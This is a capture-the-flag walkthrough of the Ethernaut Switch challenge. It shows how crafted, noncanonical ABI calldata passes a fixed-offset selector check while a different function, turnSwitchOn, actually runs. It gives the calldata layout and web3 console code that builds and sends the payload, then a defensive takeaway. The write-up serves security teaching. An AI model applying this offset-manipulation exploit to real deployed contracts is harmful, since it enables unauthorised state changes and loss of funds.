# Ethernaut Switch — Calldata Offset Manipulation

A walkthrough of the Ethernaut **Switch** challenge, demonstrating how a hardcoded calldata check can disagree with Solidity's ABI decoder for a dynamic `bytes` argument.

## Challenge

The goal is to set `switchOn` to `true` through `flipSwitch(bytes)` even though its `onlyOff` modifier requires the `turnSwitchOff()` selector at calldata byte 68.

```solidity
modifier onlyOff() {
    bytes32[1] memory selector;
    assembly {
        calldatacopy(selector, 68, 4)
    }
    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
    _;
}

function flipSwitch(bytes memory _data) public onlyOff {
    (bool success,) = address(this).call(_data);
    require(success, "call failed :(");
}

function turnSwitchOn() public onlyThis {
    switchOn = true;
}
```

> The modifier's error message may use `turnOffSwitch`, but the function selector used in this instance is `turnSwitchOff()`.

## Root cause

The modifier reads **four bytes at absolute calldata offset 68**:

```solidity
calldatacopy(selector, 68, 4)
```

But Solidity decodes the dynamic `_data` argument using the **offset stored in the ABI head**. The caller can construct noncanonical ABI calldata that places the actual argument at a different position. Consequently, the modifier validates one selector while `address(this).call(_data)` executes another.

This is an **ABI calldata offset manipulation / validation mismatch**, not an arithmetic overflow.

## Function selectors

| Function | Selector |
| --- | --- |
| `flipSwitch(bytes)` | `0x30c13ade` |
| `turnSwitchOff()` | `0x20606e15` |
| `turnSwitchOn()` | `0x76227e12` |

## Crafted calldata layout

The offset is relative to the start of ABI arguments, immediately after the outer four-byte function selector.

| Absolute calldata bytes | Contents | Purpose |
| --- | --- | --- |
| 0–3 | `30c13ade` | Call `flipSwitch(bytes)` |
| 4–35 | `0x60` as a 32-byte word | Point to the dynamic argument's length word |
| 36–67 | Zero word | Unused gap |
| 68–99 | `20606e15` followed by 28 zero bytes | Satisfy the modifier's fixed-position check |
| 100–131 | `0x04` as a 32-byte word | Declare a four-byte `_data` argument |
| 132–163 | `76227e12` followed by 28 zero bytes | Actual `_data` executed by the self-call |

Why byte **132**? `4` (outer selector) + `0x60` (96-byte ABI offset) + `32` (length word) = `132`.

## Reproduce in the Ethernaut browser console

The following uses the `web3` object exposed by the challenge environment.

```javascript
const target = "0x08B681130Bf933BcE21B3401DB8391ac6ca0cd4f";

const flip = web3.eth.abi.encodeFunctionSignature("flipSwitch(bytes)");
const off = web3.eth.abi.encodeFunctionSignature("turnSwitchOff()");
const on = web3.eth.abi.encodeFunctionSignature("turnSwitchOn()");

const word = (n) => BigInt(n).toString(16).padStart(64, "0");

const calldata =
  flip +
  word(0x60) +
  word(0) +
  off.slice(2).padEnd(64, "0") +
  word(4) +
  on.slice(2).padEnd(64, "0");

console.log("Length (bytes):", (calldata.length - 2) / 2);
console.log("Modifier reads:", "0x" + calldata.slice(2 + 68 * 2, 2 + 72 * 2));
console.log("Executed selector:", "0x" + calldata.slice(2 + 132 * 2, 2 + 136 * 2));
```

Expected output:

```text
Length (bytes): 164
Modifier reads: 0x20606e15
Executed selector: 0x76227e12
```

Send the transaction **only to your own challenge instance**:

```javascript
const receipt = await web3.eth.sendTransaction({
  from: player,
  to: target,
  data: calldata,
  gas: 300000
});
console.log(receipt);
```

Then check the state:

```javascript
await contract.switchOn()
// Expected: true
```

The exact return type may depend on the challenge console's contract wrapper. The address above is the instance used for this walkthrough; replace it with your own instance if needed.

## Why the self-call works

1. `onlyOff` checks the four bytes at offset 68 and finds `turnSwitchOff()`.
2. Solidity decodes `_data` from the ABI offset `0x60`, yielding `0x76227e12`.
3. `address(this).call(_data)` makes a new external call to the same contract, selecting `turnSwitchOn()`.
4. During that self-call, `msg.sender == address(this)`, satisfying `onlyThis`.
5. `switchOn` becomes `true`.

## Security takeaway

**Never validate dynamic ABI arguments using a hardcoded absolute calldata offset.** Decode the argument and validate the decoded bytes (or their first four bytes) before executing a low-level call. When forwarding arbitrary calldata, also enforce an explicit allowlist of permitted functions.

## Status

The payload and its offsets are documented here. **Successful on-chain execution has not been independently verified in this README**; add a transaction hash or screenshot after testing your instance.

## Scope

Educational security research on the Ethernaut Switch challenge. Do not use against contracts without authorization.
